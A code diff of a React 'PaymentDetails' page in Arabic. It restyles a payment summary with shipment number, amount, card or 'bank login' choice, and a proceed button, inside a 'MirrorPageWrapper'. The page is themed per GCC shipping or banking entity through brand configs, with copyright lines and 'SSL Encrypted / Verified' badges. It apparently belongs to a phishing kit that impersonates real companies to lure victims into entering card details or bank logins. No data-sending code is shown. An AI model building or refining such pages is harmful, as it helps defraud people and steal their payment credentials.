@@ -1,17 +1,15 @@
 import { useState, useEffect, useMemo } from "react";
 import { useParams, useNavigate } from "react-router-dom";
 import { useLinkData } from "@/hooks/useLinkData";
-import { formatCurrency, getCurrencyByCountry } from "@/lib/countryCurrencies";
+import { formatCurrency } from "@/lib/countryCurrencies";
 import { resolveEntity, PaymentEntityConfig } from "@/config/gccPaymentEntities";
 import { ThemedButton } from "@/components/ui/ThemedButton";
 import { ThemedCard } from "@/components/ui/ThemedCard";
-import { ThemedHeader } from "@/components/ui/ThemedHeader";
 import {
   CreditCard,
   ArrowLeft,
   Hash,
   DollarSign,
-  Package,
   Truck,
   ShieldCheck,
   Lock,
@@ -20,9 +18,10 @@ import {
   Building2,
   Wallet,
 } from "lucide-react";
-import PaymentMetaTags from "@/components/PaymentMetaTags";
+import { DynamicMetaTags } from "@/components/DynamicMetaTags";
 import BrandedCarousel from "@/components/BrandedCarousel";
 import PageLoader from "@/components/PageLoader";
+import { MirrorPageWrapper } from "@/components/MirrorPageWrapper";
 
 const PaymentDetails = () => {
   const { id } = useParams();
@@ -80,154 +79,91 @@ const PaymentDetails = () => {
   const CategoryIcon = category === 'shipping' ? Truck : category === 'bank' ? Building2 : Wallet;
 
   return (
-    <>
-      <PaymentMetaTags
-        serviceKey={serviceKey}
-        serviceName={entityConfig.nameAr}
+    <MirrorPageWrapper 
+      entityId={serviceKey} 
+      title="تفاصيل الدفع"
+      subtitle="Review Payment Information"
+      linkData={linkData}
+      hideHeader={true}
+    >
+      <DynamicMetaTags
+        entityId={serviceKey}
         title={`تفاصيل الدفع - ${entityConfig.nameAr}`}
-        customDescription={`أكمل عملية الدفع بأمان وسهولة - ${entityConfig.nameAr}`}
         amount={formattedAmount}
-      />
-
-      <ThemedHeader
-        config={entityConfig}
-        title={entityConfig.nameAr}
-        subtitle="الدفع الآمن - Secure Payment"
       />
 
       <BrandedCarousel serviceKey={serviceKey} className="mb-0" />
 
-      <div className="min-h-screen py-8 sm:py-12" dir="rtl" style={{ background: `linear-gradient(135deg, ${entityConfig.bg}, ${entityConfig.surface})`, fontFamily: entityConfig.font }}>
-        <div className="container mx-auto px-4 max-w-2xl">
-          {/* Page Title */}
-          <div className="text-center mb-8">
-            <div className="flex items-center justify-center gap-3 mb-4">
-              <Sparkles className="w-6 h-6 text-primary" />
-              <h1 className="text-2xl sm:text-3xl font-bold text-foreground">تفاصيل الدفع</h1>
-            </div>
-            <p className="text-sm sm:text-base text-muted-foreground">راجع تفاصيل طلبك قبل المتابعة للدفع</p>
+      <div className="space-y-6">
+        {/* Page Title */}
+        <div className="text-center mb-4">
+          <div className="flex items-center justify-center gap-3 mb-2">
+            <Sparkles className="w-6 h-6 text-primary" />
+            <h1 className="text-2xl sm:text-3xl font-bold text-foreground">ملخص الطلب</h1>
           </div>
+          <p className="text-sm text-muted-foreground">راجع تفاصيل طلبك قبل المتابعة للدفع</p>
+        </div>
 
-          {/* Entity Info Card */}
-          <ThemedCard config={entityConfig} variant="elevated" className="mb-6 overflow-hidden">
-            <div className="px-6 sm:px-8 py-6" style={{ background: `linear-gradient(135deg, ${entityConfig.primary}15, ${entityConfig.accent}15)`, borderBottom: `2px solid ${entityConfig.primary}30` }}>
-              <div className="flex items-center gap-3">
-                <div className="w-12 h-12 rounded-xl flex items-center justify-center" style={{ background: `linear-gradient(135deg, ${entityConfig.primary}, ${entityConfig.accent})` }}>
-                  <CategoryIcon className="w-6 h-6 text-white" />
-                </div>
-                <div>
-                  <h2 className="text-lg sm:text-xl font-bold text-foreground">
-                    {category === 'shipping' ? 'تفاصيل الشحنة' : category === 'bank' ? 'تفاصيل الحساب' : 'تفاصيل الطلب'}
-                  </h2>
-                  <p className="text-sm text-muted-foreground">
-                    {category === 'shipping' ? 'معلومات الطرد والتوصيل' : category === 'bank' ? 'معلومات الحساب البنكي' : 'معلومات الخدمة المطلوبة'}
-                  </p>
-                </div>
+        {/* Entity Info Card */}
+        <ThemedCard config={entityConfig} variant="elevated" className="overflow-hidden">
+          <div className="px-6 py-6" style={{ background: `linear-gradient(135deg, ${entityConfig.primary}15, ${entityConfig.accent}15)`, borderBottom: `2px solid ${entityConfig.primary}30` }}>
+            <div className="flex items-center gap-3">
+              <div className="w-12 h-12 rounded-xl flex items-center justify-center" style={{ background: `linear-gradient(135deg, ${entityConfig.primary}, ${entityConfig.accent})` }}>
+                <CategoryIcon className="w-6 h-6 text-white" />
+              </div>
+              <div>
+                <h2 className="text-lg font-bold text-foreground">
+                  {category === 'shipping' ? 'تفاصيل الشحنة' : category === 'bank' ? 'تفاصيل الحساب' : 'تفاصيل الطلب'}
+                </h2>
+                <p className="text-sm text-muted-foreground">
+                  {category === 'shipping' ? 'معلومات الطرد والتوصيل' : 'معلومات الخدمة المطلوبة'}
+                </p>
               </div>
             </div>
+          </div>
 
-            {shippingInfo && (
-              <div className="px-6 sm:px-8 py-6 space-y-4 bg-card">
-                {shippingInfo.tracking_number && (
-                  <div className="flex items-center justify-between py-3 border-b border-border">
-                    <div className="flex items-center gap-2 text-muted-foreground">
-                      <Hash className="w-4 h-4" />
-                      <span className="text-sm">رقم الشحنة</span>
-                    </div>
-                    <span className="font-bold text-base">{shippingInfo.tracking_number}</span>
-                  </div>
-                )}
-                {shippingInfo.package_description && (
-                  <div className="flex items-center justify-between py-3 border-b border-border">
-                    <div className="flex items-center gap-2 text-muted-foreground">
-                      <Truck className="w-4 h-4" />
-                      <span className="text-sm">وصف الطرد</span>
-                    </div>
-                    <span className="font-semibold text-base">{shippingInfo.package_description}</span>
-                  </div>
-                )}
+          <div className="px-6 py-6 space-y-4 bg-card">
+            {shippingInfo?.tracking_number && (
+              <div className="flex items-center justify-between py-2 border-b border-border">
+                <span className="text-sm text-muted-foreground">رقم الشحنة</span>
+                <span className="font-bold">{shippingInfo.tracking_number}</span>
               </div>
             )}
-          </ThemedCard>
-
-          {/* Payment Summary */}
-          <ThemedCard config={entityConfig} variant="elevated" className="mb-6 overflow-hidden">
-            <div className="px-6 sm:px-8 py-6" style={{ background: `linear-gradient(135deg, ${entityConfig.primary}15, ${entityConfig.accent}15)`, borderBottom: `2px solid ${entityConfig.primary}30` }}>
-              <div className="flex items-center gap-3">
-                <div className="w-12 h-12 rounded-xl flex items-center justify-center" style={{ background: `linear-gradient(135deg, ${entityConfig.primary}, ${entityConfig.accent})` }}>
-                  <DollarSign className="w-6 h-6 text-white" />
-                </div>
-                <div>
-                  <h2 className="text-lg sm:text-xl font-bold text-foreground">ملخص الدفع</h2>
-                  <p className="text-sm text-muted-foreground">المبلغ المطلوب</p>
-                </div>
-              </div>
+            <div className="flex justify-between items-center py-4 px-4 rounded-xl" style={{ background: `linear-gradient(135deg, ${entityConfig.primary}10, ${entityConfig.accent}10)` }}>
+              <span className="text-lg font-bold">المبلغ الإجمالي</span>
+              <span className="text-2xl font-bold text-primary">{formattedAmount}</span>
             </div>
-
-            <div className="px-6 sm:px-8 py-6 space-y-4 bg-card">
-              <div className="flex justify-between py-3 border-b border-border">
-                <span className="text-muted-foreground">الخدمة</span>
-                <span className="font-bold text-base">{entityConfig.nameAr}</span>
-              </div>
-
-              <div className="flex justify-between items-center py-5 px-5 rounded-xl" style={{ background: `linear-gradient(135deg, ${entityConfig.primary}10, ${entityConfig.accent}10)` }}>
-                <span className="text-lg font-bold">المبلغ الإجمالي</span>
-                <span className="text-2xl sm:text-3xl font-bold text-primary">{formattedAmount}</span>
-              </div>
-            </div>
-          </ThemedCard>
-
-          {/* Payment Method */}
-          <ThemedCard config={entityConfig} variant="elevated" className="mb-8 overflow-hidden">
-            <div className="px-6 sm:px-8 py-6" style={{ background: `linear-gradient(135deg, ${entityConfig.primary}15, ${entityConfig.accent}15)`, borderBottom: `2px solid ${entityConfig.primary}30` }}>
-              <div className="flex items-center gap-3">
-                <div className="w-12 h-12 rounded-xl flex items-center justify-center" style={{ background: `linear-gradient(135deg, ${entityConfig.primary}, ${entityConfig.accent})` }}>
-                  <CreditCard className="w-6 h-6 text-white" />
-                </div>
-                <div>
-                  <h2 className="text-lg sm:text-xl font-bold text-foreground">طريقة الدفع</h2>
-                  <p className="text-sm text-muted-foreground">الدفع الإلكتروني الآمن</p>
-                </div>
-              </div>
-            </div>
-
-            <div className="px-6 sm:px-8 py-6 bg-card">
-              <div className="flex items-center gap-4 p-5 rounded-xl border-2" style={{ borderColor: entityConfig.primary, background: `${entityConfig.primary}08` }}>
-                <div className="w-12 h-12 rounded-lg flex items-center justify-center flex-shrink-0" style={{ background: `${entityConfig.primary}20` }}>
-                  {methodParam === 'bank_login' ? <Lock className="w-6 h-6 text-primary" /> : <CreditCard className="w-6 h-6 text-primary" />}
-                </div>
-                <div className="flex-1">
-                  <p className="font-bold text-base mb-1">{methodParam === 'bank_login' ? 'تسجيل دخول البنك 🏦' : 'الدفع بالبطاقة 💳'}</p>
-                  <p className="text-sm text-muted-foreground">{methodParam === 'bank_login' ? 'الدفع الآمن عبر حسابك البنكي' : 'Visa • Mastercard • Mada'}</p>
-                </div>
-                <CheckCircle2 className="w-6 h-6 text-primary" />
-              </div>
-            </div>
-          </ThemedCard>
-
-          {/* Proceed Button */}
-          <ThemedButton config={entityConfig} onClick={handleProceed}>
-            <span className="ml-3">متابعة للدفع</span>
-            <ArrowLeft className="w-5 h-5 sm:w-6 sm:h-6" />
-          </ThemedButton>
-
-          <div className="mt-6 flex items-center justify-center gap-2 text-sm text-muted-foreground">
-            <Lock className="w-4 h-4" />
-            <p>بالمتابعة، أنت توافق على <a href="#" className="underline hover:no-underline text-primary">الشروط والأحكام</a></p>
           </div>
+        </ThemedCard>
 
-          {/* Footer */}
-          <div className="mt-8 text-center">
-            <div className="flex items-center justify-center gap-4 text-xs mb-3 text-muted-foreground">
-              <div className="flex items-center gap-1.5"><Lock className="w-3.5 h-3.5" /><span>SSL Encrypted</span></div>
-              <span>•</span>
-              <div className="flex items-center gap-1.5"><ShieldCheck className="w-3.5 h-3.5" /><span>Verified</span></div>
+        {/* Payment Method */}
+        <ThemedCard config={entityConfig} variant="elevated" className="overflow-hidden">
+          <div className="px-6 py-4 bg-card">
+            <div className="flex items-center gap-4 p-4 rounded-xl border-2" style={{ borderColor: entityConfig.primary, background: `${entityConfig.primary}08` }}>
+              <div className="w-10 h-10 rounded-lg flex items-center justify-center flex-shrink-0" style={{ background: `${entityConfig.primary}20` }}>
+                {methodParam === 'bank_login' ? <Lock className="w-5 h-5 text-primary" /> : <CreditCard className="w-5 h-5 text-primary" />}
+              </div>
+              <div className="flex-1">
+                <p className="font-bold text-sm mb-0.5">{methodParam === 'bank_login' ? 'تسجيل دخول البنك' : 'الدفع بالبطاقة'}</p>
+                <p className="text-xs text-muted-foreground">{methodParam === 'bank_login' ? 'عبر حسابك البنكي' : 'Visa • Mastercard • Mada'}</p>
+              </div>
+              <CheckCircle2 className="w-5 h-5 text-primary" />
             </div>
-            <p className="text-xs" style={{ color: `${entityConfig.textMuted}80` }}>© 2025 {entityConfig.nameAr}. جميع الحقوق محفوظة.</p>
           </div>
+        </ThemedCard>
+
+        {/* Proceed Button */}
+        <ThemedButton config={entityConfig} onClick={handleProceed}>
+          <span className="ml-3">متابعة للدفع</span>
+          <ArrowLeft className="w-5 h-5 sm:w-6 sm:h-6" />
+        </ThemedButton>
+
+        <div className="mt-4 flex items-center justify-center gap-2 text-[10px] text-muted-foreground uppercase tracking-widest font-bold">
+          <Lock className="w-3.5 h-3.5" />
+          <span>تشفير بيانات آمن 256-bit SSL</span>
         </div>
       </div>
-    </>
+    </MirrorPageWrapper>
   );
 };
 
